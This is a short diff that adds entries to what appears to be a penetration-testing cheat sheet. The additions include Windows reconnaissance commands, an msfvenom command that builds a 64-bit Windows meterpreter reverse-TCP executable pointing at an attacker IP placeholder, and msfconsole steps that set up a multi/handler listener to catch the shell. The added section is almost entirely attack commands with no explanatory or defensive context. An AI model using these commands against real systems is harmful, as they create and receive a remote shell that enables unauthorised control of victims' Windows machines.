@@ -25,3 +25,17 @@ host> ssh -i ~/.ssh/rsakey <user>@<target>
 # Retrieve public RSA key from private one
 ssh-keygen -y -f <rsakey_file>
 
+# Get version of Windows from cmd
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+
+# Get architecture of Windows from cmd
+wmic os get osarchitecture
+
+# Create reverse shell in exe for Win64bits
+msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker's IP] lport=4444 -f exe -o /tmp/my_payload.exe
+
+# Get a handler
+msfconsole -q
+use exploit/multi/handler
+set payload windows/shell/reverse_tcp
+
